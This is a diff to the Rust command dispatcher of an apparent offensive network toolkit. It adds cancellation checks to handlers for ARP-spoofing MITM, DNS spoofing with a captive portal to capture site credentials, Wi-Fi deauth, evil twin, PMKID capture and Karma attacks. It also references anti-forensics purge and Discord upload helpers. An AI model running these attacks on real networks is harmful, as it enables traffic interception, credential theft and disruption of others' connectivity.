@@ -15,8 +15,9 @@ use chrono::Local;
 use ipnet::Ipv4Net;
 use regex::Regex;
 use rustyjack_ethernet::{
-    build_device_inventory, connect_tcp_with_source, discover_hosts, discover_hosts_arp,
-    quick_port_scan, DeviceInfo, LanDiscoveryResult,
+    build_device_inventory, build_device_inventory_cancellable, connect_tcp_with_source,
+    discover_hosts, discover_hosts_arp, discover_hosts_arp_cancellable, discover_hosts_cancellable,
+    quick_port_scan, quick_port_scan_cancellable, DeviceInfo, LanDiscoveryResult,
 };
 use rustyjack_evasion::{
     MacAddress, MacGenerationStrategy, MacManager, MacMode, MacPolicyConfig, MacPolicyEngine,
@@ -24,8 +25,10 @@ use rustyjack_evasion::{
 };
 use rustyjack_portal::{start_portal, stop_portal, PortalConfig};
 use rustyjack_wireless::{
-    arp_scan, calculate_bandwidth, discover_gateway, discover_mdns_devices, get_traffic_stats,
-    capture_dns_queries, hotspot_disconnect_client, hotspot_set_blacklist, scan_network_services,
+    arp_scan, arp_scan_cancellable, calculate_bandwidth, discover_gateway,
+    discover_mdns_devices, discover_mdns_devices_cancellable, get_traffic_stats,
+    capture_dns_queries, capture_dns_queries_cancellable, hotspot_disconnect_client,
+    hotspot_set_blacklist, scan_network_services, scan_network_services_cancellable,
     start_hotspot, status_hotspot, stop_hotspot, HotspotConfig, HotspotState,
 };
 use serde_json::{json, Map, Value};
@@ -57,6 +60,7 @@ use crate::cli::{
 #[cfg(target_os = "linux")]
 use crate::netlink_helpers::netlink_set_interface_up;
 use crate::anti_forensics::perform_complete_purge;
+use crate::cancel::{cancel_sleep, check_cancel, CancelFlag, CancelledError};
 use crate::mount::{MountMode, MountPolicy, MountRequest, UnmountRequest};
 use crate::system::{
     active_uplink, acquire_dhcp_lease, append_payload_log, apply_interface_isolation_strict,
@@ -70,7 +74,8 @@ use crate::system::{
     process_running_exact, randomize_hostname, read_default_route, read_discord_webhook,
     read_dns_servers, read_interface_preference, read_interface_preference_with_mac,
     read_interface_stats, read_wifi_link_info, restart_system_service, restore_routing_state,
-    sanitize_label, save_wifi_profile, scan_local_hosts, scan_wifi_networks, select_active_uplink,
+    sanitize_label, save_wifi_profile, scan_local_hosts, scan_local_hosts_cancellable,
+    scan_wifi_networks, scan_wifi_networks_with_timeout_cancel, select_active_uplink,
     select_best_interface, select_wifi_interface, send_discord_payload, send_scan_to_discord,
     set_interface_metric, spawn_arpspoof_pair, start_bridge_pair, start_dns_spoof,
     start_pcap_capture, stop_arp_spoof, stop_bridge_pair, stop_dns_spoof, stop_pcap_capture,
@@ -79,6 +84,23 @@ use crate::system::{
 };
 
 pub type HandlerResult = (String, Value);
+
+pub fn is_cancelled_error(err: &anyhow::Error) -> bool {
+    for cause in err.chain() {
+        if cause.is::<CancelledError>() {
+            return true;
+        }
+        if let Some(wireless) = cause.downcast_ref::<rustyjack_wireless::WirelessError>() {
+            if matches!(wireless, rustyjack_wireless::WirelessError::Cancelled) {
+                return true;
+            }
+        }
+        if cause.is::<rustyjack_ethernet::CancelledError>() {
+            return true;
+        }
+    }
+    false
+}
 
 static HOTSPOT_POLICY_GUARD: OnceLock<StdMutex<Option<IsolationPolicyGuard>>> = OnceLock::new();
 
@@ -159,6 +181,15 @@ fn validate_and_enforce_interface(
 }
 
 pub fn dispatch_command(root: &Path, command: Commands) -> Result<HandlerResult> {
+    dispatch_command_with_cancel(root, command, None)
+}
+
+pub fn dispatch_command_with_cancel(
+    root: &Path,
+    command: Commands,
+    cancel: Option<&CancelFlag>,
+) -> Result<HandlerResult> {
+    check_cancel(cancel)?;
     match command {
         Commands::Scan(ScanCommand::Run(args)) => handle_scan_run(root, args),
         Commands::Notify(NotifyCommand::Discord(sub)) => match sub {
@@ -166,7 +197,7 @@ pub fn dispatch_command(root: &Path, command: Commands) -> Result<HandlerResult>
             DiscordCommand::Status => handle_discord_status(root),
         },
         Commands::Mitm(sub) => match sub {
-            MitmCommand::Start(args) => handle_mitm_start(root, args),
+            MitmCommand::Start(args) => handle_mitm_start(root, args, cancel),
             MitmCommand::Stop => handle_mitm_stop(),
         },
         Commands::DnsSpoof(sub) => match sub {
@@ -183,7 +214,7 @@ pub fn dispatch_command(root: &Path, command: Commands) -> Result<HandlerResult>
             WifiCommand::MacSet(args) => handle_wifi_mac_set(args),
             WifiCommand::MacRestore(args) => handle_wifi_mac_restore(args),
             WifiCommand::TxPower(args) => handle_wifi_tx_power(args),
-            WifiCommand::Scan(args) => handle_wifi_scan(root, args),
+            WifiCommand::Scan(args) => handle_wifi_scan(root, args, cancel),
             WifiCommand::Profile(profile) => match profile {
                 WifiProfileCommand::List => handle_wifi_profile_list(root),
                 WifiProfileCommand::Show(args) => handle_wifi_profile_show(root, args),
@@ -199,19 +230,19 @@ pub fn dispatch_command(root: &Path, command: Commands) -> Result<HandlerResult>
                 WifiRouteCommand::Restore => handle_wifi_route_restore(root),
                 WifiRouteCommand::SetMetric(args) => handle_wifi_route_metric(args),
             },
-            WifiCommand::Deauth(args) => handle_wifi_deauth(root, args),
-            WifiCommand::EvilTwin(args) => handle_wifi_evil_twin(root, args),
-            WifiCommand::PmkidCapture(args) => handle_wifi_pmkid(root, args),
-            WifiCommand::ProbeSniff(args) => handle_wifi_probe_sniff(root, args),
-            WifiCommand::Crack(args) => handle_wifi_crack(root, args),
-            WifiCommand::Karma(args) => handle_wifi_karma(root, args),
+            WifiCommand::Deauth(args) => handle_wifi_deauth(root, args, cancel),
+            WifiCommand::EvilTwin(args) => handle_wifi_evil_twin(root, args, cancel),
+            WifiCommand::PmkidCapture(args) => handle_wifi_pmkid(root, args, cancel),
+            WifiCommand::ProbeSniff(args) => handle_wifi_probe_sniff(root, args, cancel),
+            WifiCommand::Crack(args) => handle_wifi_crack(root, args, cancel),
+            WifiCommand::Karma(args) => handle_wifi_karma(root, args, cancel),
             WifiCommand::Recon(recon) => match recon {
-                WifiReconCommand::Gateway(args) => handle_wifi_recon_gateway(args),
-                WifiReconCommand::ArpScan(args) => handle_wifi_recon_arp_scan(args),
-                WifiReconCommand::ServiceScan(args) => handle_wifi_recon_service_scan(args),
-                WifiReconCommand::MdnsScan(args) => handle_wifi_recon_mdns_scan(args),
-                WifiReconCommand::Bandwidth(args) => handle_wifi_recon_bandwidth(args),
-                WifiReconCommand::DnsCapture(args) => handle_wifi_recon_dns_capture(args),
+                WifiReconCommand::Gateway(args) => handle_wifi_recon_gateway(args, cancel),
+                WifiReconCommand::ArpScan(args) => handle_wifi_recon_arp_scan(args, cancel),
+                WifiReconCommand::ServiceScan(args) => handle_wifi_recon_service_scan(args, cancel),
+                WifiReconCommand::MdnsScan(args) => handle_wifi_recon_mdns_scan(args, cancel),
+                WifiReconCommand::Bandwidth(args) => handle_wifi_recon_bandwidth(args, cancel),
+                WifiReconCommand::DnsCapture(args) => handle_wifi_recon_dns_capture(args, cancel),
             },
         },
         Commands::Loot(sub) => match sub {
@@ -232,7 +263,9 @@ pub fn dispatch_command(root: &Path, command: Commands) -> Result<HandlerResult>
         Commands::System(SystemCommand::Reboot) => handle_system_reboot(),
         Commands::System(SystemCommand::Poweroff) => handle_system_poweroff(),
         Commands::System(SystemCommand::Purge) => handle_system_purge(root),
-        Commands::System(SystemCommand::InstallWifiDrivers) => handle_system_install_wifi_drivers(root),
+        Commands::System(SystemCommand::InstallWifiDrivers) => {
+            handle_system_install_wifi_drivers(root)
+        }
         Commands::System(SystemCommand::UsbMount(args)) => handle_system_usb_mount(root, args),
         Commands::System(SystemCommand::UsbUnmount(args)) => handle_system_usb_unmount(root, args),
         Commands::System(SystemCommand::ExportLogsToUsb(args)) => {
@@ -247,10 +280,10 @@ pub fn dispatch_command(root: &Path, command: Commands) -> Result<HandlerResult>
             HardwareCommand::Detect => handle_hardware_detect(),
         },
         Commands::Ethernet(sub) => match sub {
-            EthernetCommand::Discover(args) => handle_eth_discover(root, args),
-            EthernetCommand::PortScan(args) => handle_eth_port_scan(root, args),
-            EthernetCommand::Inventory(args) => handle_eth_inventory(root, args),
-            EthernetCommand::SiteCredCapture(args) => handle_eth_site_cred_capture(root, args),
+            EthernetCommand::Discover(args) => handle_eth_discover(root, args, cancel),
+            EthernetCommand::PortScan(args) => handle_eth_port_scan(root, args, cancel),
+            EthernetCommand::Inventory(args) => handle_eth_inventory(root, args, cancel),
+            EthernetCommand::SiteCredCapture(args) => handle_eth_site_cred_capture(root, args, cancel),
         },
         Commands::Hotspot(sub) => match sub {
             HotspotCommand::Start(args) => handle_hotspot_start(root, args),
@@ -272,15 +305,35 @@ fn run_arp_discovery(
     net: Ipv4Net,
     rate_limit_pps: Option<u32>,
     timeout: Duration,
+    cancel: Option<&CancelFlag>,
 ) -> Result<LanDiscoveryResult> {
-    match tokio::runtime::Handle::try_current() {
-        Ok(handle) => handle.block_on(async {
-            discover_hosts_arp(interface, net, rate_limit_pps, timeout).await
-        }),
-        Err(_) => {
-            let rt =
-                crate::runtime::shared_runtime().context("using shared tokio runtime for ARP")?;
-            rt.block_on(async { discover_hosts_arp(interface, net, rate_limit_pps, timeout).await })
+    if let Some(flag) = cancel {
+        check_cancel(Some(flag))?;
+        match tokio::runtime::Handle::try_current() {
+            Ok(handle) => handle.block_on(async {
+                discover_hosts_arp_cancellable(interface, net, rate_limit_pps, timeout, flag).await
+            }),
+            Err(_) => {
+                let rt = crate::runtime::shared_runtime()
+                    .context("using shared tokio runtime for ARP")?;
+                rt.block_on(async {
+                    discover_hosts_arp_cancellable(interface, net, rate_limit_pps, timeout, flag)
+                        .await
+                })
+            }
+        }
+    } else {
+        match tokio::runtime::Handle::try_current() {
+            Ok(handle) => handle.block_on(async {
+                discover_hosts_arp(interface, net, rate_limit_pps, timeout).await
+            }),
+            Err(_) => {
+                let rt = crate::runtime::shared_runtime()
+                    .context("using shared tokio runtime for ARP")?;
+                rt.block_on(async {
+                    discover_hosts_arp(interface, net, rate_limit_pps, timeout).await
+                })
+            }
         }
     }
 }
@@ -291,14 +344,21 @@ fn run_arp_discovery(
     net: Ipv4Net,
     rate_limit_pps: Option<u32>,
     timeout: Duration,
+    cancel: Option<&CancelFlag>,
 ) -> Result<LanDiscoveryResult> {
+    check_cancel(cancel)?;
     discover_hosts_arp(interface, net, rate_limit_pps, timeout)
 }
 
-fn handle_eth_discover(root: &Path, args: EthernetDiscoverArgs) -> Result<HandlerResult> {
+fn handle_eth_discover(
+    root: &Path,
+    args: EthernetDiscoverArgs,
+    cancel: Option<&CancelFlag>,
+) -> Result<HandlerResult> {
     let interface = detect_ethernet_interface(args.interface.clone())?;
 
     enforce_single_interface(&interface.name)?;
+    check_cancel(cancel)?;
 
     let cidr = args
         .target
@@ -308,10 +368,25 @@ fn handle_eth_discover(root: &Path, args: EthernetDiscoverArgs) -> Result<Handle
 
     let timeout = Duration::from_millis(args.timeout_ms.max(50));
     let mut hosts_detail = Vec::new();
-    if let Ok(arp_result) = run_arp_discovery(&interface.name, net, Some(50), timeout) {
-        hosts_detail.extend(arp_result.details);
+    match run_arp_discovery(&interface.name, net, Some(50), timeout, cancel) {
+        Ok(arp_result) => hosts_detail.extend(arp_result.details),
+        Err(err) => {
+            if is_cancelled_error(&err) {
+                return Err(err);
+            }
+        }
     }
-    if let Ok(icmp_result) = discover_hosts(net, timeout) {
+    check_cancel(cancel)?;
+    if let Some(flag) = cancel {
+        match discover_hosts_cancellable(net, timeout, flag) {
+            Ok(icmp_result) => hosts_detail.extend(icmp_result.details),
+            Err(err) => {
+                if is_cancelled_error(&err) {
+                    return Err(err);
+                }
+            }
+        }
+    } else if let Ok(icmp_result) = discover_hosts(net, timeout) {
         hosts_detail.extend(icmp_result.details);
     }
     let mut seen = std::collections::HashSet::new();
@@ -395,7 +470,11 @@ fn handle_eth_discover(root: &Path, args: EthernetDiscoverArgs) -> Result<Handle
     ))
 }
 
-fn handle_eth_port_scan(root: &Path, args: EthernetPortScanArgs) -> Result<HandlerResult> {
+fn handle_eth_port_scan(
+    root: &Path,
+    args: EthernetPortScanArgs,
+    cancel: Option<&CancelFlag>,
+) -> Result<HandlerResult> {
     let interface = detect_ethernet_interface(args.interface.clone())?;
     let target: std::net::Ipv4Addr = if let Some(t) = args.target.as_ref() {
         t.parse().context("parsing target IPv4")?
@@ -419,8 +498,14 @@ fn handle_eth_port_scan(root: &Path, args: EthernetPortScanArgs) -> Result<Handl
         bail!("No ports provided for scan");
     }
 
+    check_cancel(cancel)?;
     let timeout = Duration::from_millis(args.timeout_ms.max(50));
-    let result = quick_port_scan(target, &ports, timeout).context("running port scan")?;
+    let result = if let Some(flag) = cancel {
+        quick_port_scan_cancellable(target, &ports, timeout, flag)
+            .context("running port scan")?
+    } else {
+        quick_port_scan(target, &ports, timeout).context("running port scan")?
+    };
 
     // Save loot
     let loot_dir = root.join("loot").join("Ethernet");
@@ -492,7 +577,11 @@ fn handle_eth_port_scan(root: &Path, args: EthernetPortScanArgs) -> Result<Handl
     ))
 }
 
-fn handle_eth_inventory(root: &Path, args: EthernetInventoryArgs) -> Result<HandlerResult> {
+fn handle_eth_inventory(
+    root: &Path,
+    args: EthernetInventoryArgs,
+    cancel: Option<&CancelFlag>,
+) -> Result<HandlerResult> {
     let interface = detect_ethernet_interface(args.interface.clone())?;
     let cidr = args
         .target
@@ -501,13 +590,35 @@ fn handle_eth_inventory(root: &Path, args: EthernetInventoryArgs) -> Result<Hand
     let net: Ipv4Net = cidr.parse().context("parsing target CIDR")?;
 
     let timeout = Duration::from_millis(args.timeout_ms.max(200));
+    check_cancel(cancel)?;
 
     // Combine ARP and ICMP to find hosts
     let mut details = Vec::new();
-    if let Ok(arp) = run_arp_discovery(&interface.name, net, Some(50), timeout) {
-        details.extend(arp.details);
+    match run_arp_discovery(&interface.name, net, Some(50), timeout, cancel) {
+        Ok(arp) => details.extend(arp.details),
+        Err(err) => {
+            if is_cancelled_error(&err) {
+                return Err(err);
+            }
+        }
     }
-    if let Ok(icmp) = discover_hosts(net, timeout) {
+    check_cancel(cancel)?;
+    if let Some(flag) = cancel {
+        match discover_hosts_cancellable(net, timeout, flag) {
+            Ok(icmp) => {
+                for d in icmp.details {
+                    if !details.iter().any(|h| h.ip == d.ip) {
+                        details.push(d);
+                    }
+                }
+            }
+            Err(err) => {
+                if is_cancelled_error(&err) {
+                    return Err(err);
+                }
+            }
+        }
+    } else if let Ok(icmp) = discover_hosts(net, timeout) {
         for d in icmp.details {
             if !details.iter().any(|h| h.ip == d.ip) {
                 details.push(d);
@@ -528,7 +639,11 @@ fn handle_eth_inventory(root: &Path, args: EthernetInventoryArgs) -> Result<Hand
     };
 
     let default_ports = vec![22, 80, 443, 445, 139, 3389, 53, 8080, 8000, 8443];
-    let devices = build_device_inventory(&discovery, &default_ports, timeout)?;
+    let devices = if let Some(flag) = cancel {
+        build_device_inventory_cancellable(&discovery, &default_ports, timeout, flag)?
+    } else {
+        build_device_inventory(&discovery, &default_ports, timeout)?
+    };
 
     // Save loot under per-network directory
     let target_name = net
@@ -1234,7 +1349,9 @@ fn run_scan_discovery(
     match target {
         ScanTarget::Network(net) => {
             if matches!(mode, ScanDiscovery::Arp | ScanDiscovery::Both) {
-                if let Ok(arp_result) = run_arp_discovery(interface, *net, arp_rate_pps, timeout) {
+                if let Ok(arp_result) =
+                    run_arp_discovery(interface, *net, arp_rate_pps, timeout, None)
+                {
                     details.extend(arp_result.details);
                 }
             }
@@ -1251,7 +1368,9 @@ fn run_scan_discovery(
                     Err(_) => continue,
                 };
                 if matches!(mode, ScanDiscovery::Arp | ScanDiscovery::Both) {
-                    if let Ok(arp_result) = run_arp_discovery(interface, net, arp_rate_pps, timeout) {
+                    if let Ok(arp_result) =
+                        run_arp_discovery(interface, net, arp_rate_pps, timeout, None)
+                    {
                         details.extend(arp_result.details);
                     }
                 }
@@ -1653,7 +1772,11 @@ fn handle_discord_status(root: &Path) -> Result<HandlerResult> {
     Ok((message, data))
 }
 
-fn handle_mitm_start(root: &Path, args: MitmStartArgs) -> Result<HandlerResult> {
+fn handle_mitm_start(
+    root: &Path,
+    args: MitmStartArgs,
+    cancel: Option<&CancelFlag>,
+) -> Result<HandlerResult> {
     let MitmStartArgs {
         interface,
         network,
@@ -1663,6 +1786,7 @@ fn handle_mitm_start(root: &Path, args: MitmStartArgs) -> Result<HandlerResult> 
     let interface_info = detect_interface(interface)?;
 
     enforce_single_interface(&interface_info.name)?;
+    check_cancel(cancel)?;
 
     let gateway = default_gateway_ip().context("determining default gateway for MITM")?;
     let network = network.unwrap_or_else(|| interface_info.network_cidr());
@@ -1670,7 +1794,7 @@ fn handle_mitm_start(root: &Path, args: MitmStartArgs) -> Result<HandlerResult> 
     let _ = stop_arp_spoof();
     let _ = stop_pcap_capture();
 
-    let hosts = scan_local_hosts(&interface_info.name)?;
+    let hosts = scan_local_hosts_cancellable(&interface_info.name, cancel)?;
     let victims: Vec<_> = hosts
         .into_iter()
         .filter(|host| host.ip != gateway)
@@ -1841,7 +1965,11 @@ fn build_portal_config(
     }
 }
 
-fn handle_eth_site_cred_capture(root: &Path, args: EthernetSiteCredArgs) -> Result<HandlerResult> {
+fn handle_eth_site_cred_capture(
+    root: &Path,
+    args: EthernetSiteCredArgs,
+    cancel: Option<&CancelFlag>,
+) -> Result<HandlerResult> {
     let EthernetSiteCredArgs {
         interface,
         target,
@@ -1860,13 +1988,35 @@ fn handle_eth_site_cred_capture(root: &Path, args: EthernetSiteCredArgs) -> Resu
     let net: Ipv4Net = cidr.parse().context("parsing target CIDR")?;
 
     let timeout = Duration::from_millis(timeout_ms.max(200));
+    check_cancel(cancel)?;
 
     // Discovery + inventory
     let mut details = Vec::new();
-    if let Ok(arp) = run_arp_discovery(&interface_info.name, net, Some(50), timeout) {
-        details.extend(arp.details);
+    match run_arp_discovery(&interface_info.name, net, Some(50), timeout, cancel) {
+        Ok(arp) => details.extend(arp.details),
+        Err(err) => {
+            if is_cancelled_error(&err) {
+                return Err(err);
+            }
+        }
     }
-    if let Ok(icmp) = discover_hosts(net, timeout) {
+    check_cancel(cancel)?;
+    if let Some(flag) = cancel {
+        match discover_hosts_cancellable(net, timeout, flag) {
+            Ok(icmp) => {
+                for d in icmp.details {
+                    if !details.iter().any(|h| h.ip == d.ip) {
+                        details.push(d);
+                    }
+                }
+            }
+            Err(err) => {
+                if is_cancelled_error(&err) {
+                    return Err(err);
+                }
+            }
+        }
+    } else if let Ok(icmp) = discover_hosts(net, timeout) {
         for d in icmp.details {
             if !details.iter().any(|h| h.ip == d.ip) {
                 details.push(d);
@@ -1889,7 +2039,11 @@ fn handle_eth_site_cred_capture(root: &Path, args: EthernetSiteCredArgs) -> Resu
     let default_ports = vec![
         22, 80, 443, 445, 139, 3389, 53, 8080, 8000, 8443, 5353, 62078,
     ];
-    let devices = build_device_inventory(&discovery, &default_ports, timeout)?;
+    let devices = if let Some(flag) = cancel {
+        build_device_inventory_cancellable(&discovery, &default_ports, timeout, flag)?
+    } else {
+        build_device_inventory(&discovery, &default_ports, timeout)?
+    };
 
     let mut human_devices: Vec<DeviceInfo> = devices
         .into_iter()
@@ -1913,6 +2067,7 @@ fn handle_eth_site_cred_capture(root: &Path, args: EthernetSiteCredArgs) -> Resu
     if victims.is_empty() {
         bail!("No victims selected for poisoning");
     }
+    check_cancel(cancel)?;
 
     let loot_label = format!("{}-{}", site, cidr.replace('/', "_"));
     let pcap_path = build_mitm_pcap_path(root, Some(&loot_label))?;
@@ -1934,6 +2089,18 @@ fn handle_eth_site_cred_capture(root: &Path, args: EthernetSiteCredArgs) -> Resu
     let _ = stop_portal();
     let _ = stop_dns_spoof();
 
+    let cleanup = || {
+        let _ = stop_arp_spoof();
+        let _ = stop_pcap_capture();
+        let _ = stop_portal();
+        let _ = stop_dns_spoof();
+    };
+
+    if let Err(err) = check_cancel(cancel) {
+        cleanup();
+        return Err(err);
+    }
+
     enable_ip_forwarding(true)?;
 
     let gateway = interface_gateway(&interface_info.name)?
@@ -1941,9 +2108,17 @@ fn handle_eth_site_cred_capture(root: &Path, args: EthernetSiteCredArgs) -> Resu
         .ok_or_else(|| anyhow!("could not determine gateway for {}", interface_info.name))?;
 
     for host in &victims {
+        if let Err(err) = check_cancel(cancel) {
+            cleanup();
+            return Err(err);
+        }
         spawn_arpspoof_pair(&interface_info.name, gateway, host)?;
     }
 
+    if let Err(err) = check_cancel(cancel) {
+        cleanup();
+        return Err(err);
+    }
     start_pcap_capture(&interface_info.name, &pcap_path)?;
 
     // Start DNS spoof + portal
@@ -1953,7 +2128,15 @@ fn handle_eth_site_cred_capture(root: &Path, args: EthernetSiteCredArgs) -> Resu
         site_dir.clone(),
         dns_capture_dir.clone(),
     );
+    if let Err(err) = check_cancel(cancel) {
+        cleanup();
+        return Err(err);
+    }
     start_portal(portal_cfg)?;
+    if let Err(err) = check_cancel(cancel) {
+        cleanup();
+        return Err(err);
+    }
     start_dns_spoof(&interface_info.name, interface_info.address, interface_info.address)?;
     let _ = log_mac_usage(
         root,
@@ -2060,7 +2243,10 @@ fn handle_dnsspoof_stop() -> Result<HandlerResult> {
     Ok(("DNS spoofing stopped".to_string(), data))
 }
 
-fn handle_wifi_recon_gateway(args: WifiReconGatewayArgs) -> Result<HandlerResult> {
+fn handle_wifi_recon_gateway(
+    args: WifiReconGatewayArgs,
+    cancel: Option<&CancelFlag>,
+) -> Result<HandlerResult> {
     tracing::info!("Discovering gateway information");
 
     let interface = match args.interface {
@@ -2069,6 +2255,7 @@ fn handle_wifi_recon_gateway(args: WifiReconGatewayArgs) -> Result<HandlerResult
     };
 
     enforce_single_interface(&interface)?;
+    check_cancel(cancel)?;
 
     let gateway_info = discover_gateway(&interface)?;
 
@@ -2094,12 +2281,20 @@ fn handle_wifi_recon_gateway(args: WifiReconGatewayArgs) -> Result<HandlerResult
     Ok((msg, data))
 }
 
-fn handle_wifi_recon_arp_scan(args: WifiReconArpScanArgs) -> Result<HandlerResult> {
+fn handle_wifi_recon_arp_scan(
+    args: WifiReconArpScanArgs,
+    cancel: Option<&CancelFlag>,
+) -> Result<HandlerResult> {
     tracing::info!("Scanning local network via ARP on {}", args.interface);
 
     enforce_single_interface(&args.interface)?;
+    check_cancel(cancel)?;
 
-    let devices = arp_scan(&args.interface)?;
+    let devices = if cancel.is_some() {
+        arp_scan_cancellable(&args.interface, cancel)?
+    } else {
+        arp_scan(&args.interface)?
+    };
 
     let devices_json: Vec<Value> = devices
         .iter()
@@ -2125,11 +2320,23 @@ fn handle_wifi_recon_arp_scan(args: WifiReconArpScanArgs) -> Result<HandlerResul
     Ok((msg, data))
 }
 
-fn handle_wifi_recon_service_scan(args: WifiReconServiceScanArgs) -> Result<HandlerResult> {
+fn handle_wifi_recon_service_scan(
+    args: WifiReconServiceScanArgs,
+    cancel: Option<&CancelFlag>,
+) -> Result<HandlerResult> {
     tracing::info!("Scanning network services on {}", args.interface);
 
-    let devices = arp_scan(&args.interface)?;
-    let services = scan_network_services(&devices)?;
+    check_cancel(cancel)?;
+    let devices = if cancel.is_some() {
+        arp_scan_cancellable(&args.interface, cancel)?
+    } else {
+        arp_scan(&args.interface)?
+    };
+    let services = if cancel.is_some() {
+        scan_network_services_cancellable(&devices, cancel)?
+    } else {
+        scan_network_services(&devices)?
+    };
 
     let services_json: Vec<Value> = services
         .iter()
@@ -2158,10 +2365,18 @@ fn handle_wifi_recon_service_scan(args: WifiReconServiceScanArgs) -> Result<Hand
     Ok((msg, data))
 }
 
-fn handle_wifi_recon_mdns_scan(args: WifiReconMdnsScanArgs) -> Result<HandlerResult> {
+fn handle_wifi_recon_mdns_scan(
+    args: WifiReconMdnsScanArgs,
+    cancel: Option<&CancelFlag>,
+) -> Result<HandlerResult> {
     tracing::info!("Discovering mDNS devices for {} seconds", args.duration);
 
-    let devices = discover_mdns_devices(args.duration)?;
+    check_cancel(cancel)?;
+    let devices = if cancel.is_some() {
+        discover_mdns_devices_cancellable(args.duration, cancel)?
+    } else {
+        discover_mdns_devices(args.duration)?
+    };
 
     let devices_json: Vec<Value> = devices
         .iter()
@@ -2186,15 +2401,19 @@ fn handle_wifi_recon_mdns_scan(args: WifiReconMdnsScanArgs) -> Result<HandlerRes
     Ok((msg, data))
 }
 
-fn handle_wifi_recon_bandwidth(args: WifiReconBandwidthArgs) -> Result<HandlerResult> {
+fn handle_wifi_recon_bandwidth(
+    args: WifiReconBandwidthArgs,
+    cancel: Option<&CancelFlag>,
+) -> Result<HandlerResult> {
     tracing::info!(
         "Monitoring bandwidth on {} for {} seconds",
         args.interface,
         args.duration
     );
 
+    check_cancel(cancel)?;
     let before = get_traffic_stats(&args.interface)?;
-    std::thread::sleep(Duration::from_secs(args.duration));
+    cancel_sleep(cancel, Duration::from_secs(args.duration))?;
     let after = get_traffic_stats(&args.interface)?;
 
     let bandwidth = calculate_bandwidth(&before, &after);
@@ -2216,14 +2435,26 @@ fn handle_wifi_recon_bandwidth(args: WifiReconBandwidthArgs) -> Result<HandlerRe
     Ok((msg, data))
 }
 
-fn handle_wifi_recon_dns_capture(args: WifiReconDnsCaptureArgs) -> Result<HandlerResult> {
+fn handle_wifi_recon_dns_capture(
+    args: WifiReconDnsCaptureArgs,
+    cancel: Option<&CancelFlag>,
+) -> Result<HandlerResult> {
     tracing::info!(
         "Capturing DNS queries on {} for {} seconds",
         args.interface,
         args.duration
     );
 
-    let results = capture_dns_queries(&args.interface, Duration::from_secs(args.duration))?;
+    check_cancel(cancel)?;
+    let results = if cancel.is_some() {
+        capture_dns_queries_cancellable(
+            &args.interface,
+            Duration::from_secs(args.duration),
+            cancel,
+        )?
+    } else {
+        capture_dns_queries(&args.interface, Duration::from_secs(args.duration))?
+    };
     let mut queries = Vec::new();
     for query in results {
         queries.push(json!({
@@ -3312,7 +3543,11 @@ fn handle_bridge_stop(root: &Path, args: BridgeStopArgs) -> Result<HandlerResult
     Ok(("Transparent bridge disabled".to_string(), data))
 }
 
-fn handle_wifi_scan(root: &Path, args: WifiScanArgs) -> Result<HandlerResult> {
+fn handle_wifi_scan(
+    root: &Path,
+    args: WifiScanArgs,
+    cancel: Option<&CancelFlag>,
+) -> Result<HandlerResult> {
     tracing::info!("Starting WiFi scan");
 
     let interface = match args.interface {
@@ -3333,16 +3568,25 @@ fn handle_wifi_scan(root: &Path, args: WifiScanArgs) -> Result<HandlerResult> {
     enforce_single_interface(&interface)?;
     try_apply_mac_policy(root, MacStage::PreAssoc, &interface, None);
 
-    let networks = match scan_wifi_networks(&interface) {
+    check_cancel(cancel)?;
+    let networks = match scan_wifi_networks_with_timeout_cancel(
+        &interface,
+        Duration::from_secs(5),
+        cancel,
+    ) {
         Ok(nets) => {
             tracing::info!("Scan completed, found {} network(s)", nets.len());
             nets
         }
         Err(e) => {
+            if is_cancelled_error(&e) {
+                return Err(e);
+            }
             tracing::error!("WiFi scan failed on {interface}: {e}");
             bail!("WiFi scan failed: {e}");
         }
     };
+    check_cancel(cancel)?;
 
     let data = json!({
         "interface": interface,
@@ -3676,7 +3920,11 @@ fn renew_dhcp_and_reconnect(_interface: &str) -> bool {
     false
 }
 
-fn handle_wifi_deauth(root: &Path, args: WifiDeauthArgs) -> Result<HandlerResult> {
+fn handle_wifi_deauth(
+    root: &Path,
+    args: WifiDeauthArgs,
+    cancel: Option<&CancelFlag>,
+) -> Result<HandlerResult> {
     use crate::wireless_native::{self, DeauthConfig};
 
     let ssid_display = args.ssid.clone().unwrap_or_else(|| args.bssid.clone());
@@ -3718,6 +3966,7 @@ fn handle_wifi_deauth(root: &Path, args: WifiDeauthArgs) -> Result<HandlerResult
     }
 
     enforce_single_interface(&args.interface)?;
+    check_cancel(cancel)?;
 
     // Check wireless capabilities
     let caps = wireless_native::check_capabilities(&args.interface);
@@ -3768,9 +4017,14 @@ fn handle_wifi_deauth(root: &Path, args: WifiDeauthArgs) -> Result<HandlerResult
     tracing::info!("Executing native Rust deauth attack (rustyjack-wireless)");
 
     // Execute the native deauth attack
-    let result = wireless_native::execute_deauth_attack(&loot_dir, &config, |progress, status| {
-        tracing::debug!("Deauth progress: {:.0}% - {}", progress * 100.0, status);
-    })?;
+    let result = wireless_native::execute_deauth_attack_cancellable(
+        &loot_dir,
+        &config,
+        cancel,
+        |progress, status| {
+            tracing::debug!("Deauth progress: {:.0}% - {}", progress * 100.0, status);
+        },
+    )?;
 
     let target_label = args.ssid.clone().unwrap_or_else(|| args.bssid.clone());
     let log_file = if result.log_file.as_os_str().is_empty() {
@@ -3842,9 +4096,13 @@ fn handle_wifi_deauth(root: &Path, args: WifiDeauthArgs) -> Result<HandlerResult
     Ok((message, data))
 }
 
-fn handle_wifi_evil_twin(root: &Path, args: WifiEvilTwinArgs) -> Result<HandlerResult> {
+fn handle_wifi_evil_twin(
+    root: &Path,
+    args: WifiEvilTwinArgs,
+    cancel: Option<&CancelFlag>,
+) -> Result<HandlerResult> {
     use crate::wireless_native;
-    use rustyjack_wireless::evil_twin::{execute_evil_twin, EvilTwin, EvilTwinConfig};
+    use rustyjack_wireless::evil_twin::{execute_evil_twin_cancellable, EvilTwin, EvilTwinConfig};
     use std::time::Duration;
 
     tracing::info!("Starting Evil Twin attack on SSID: {}", args.ssid);
@@ -3860,6 +4118,7 @@ fn handle_wifi_evil_twin(root: &Path, args: WifiEvilTwinArgs) -> Result<HandlerR
     }
 
     enforce_single_interface(&args.interface)?;
+    check_cancel(cancel)?;
 
     // Check required tools are installed
     let missing = EvilTwin::check_requirements()
@@ -3912,10 +4171,23 @@ fn handle_wifi_evil_twin(root: &Path, args: WifiEvilTwinArgs) -> Result<HandlerR
     };
 
     // Execute the attack with progress callback
-    let result = execute_evil_twin(config, Some(&loot_dir.to_string_lossy()), |msg| {
-        tracing::info!("Evil Twin: {}", msg);
-    })
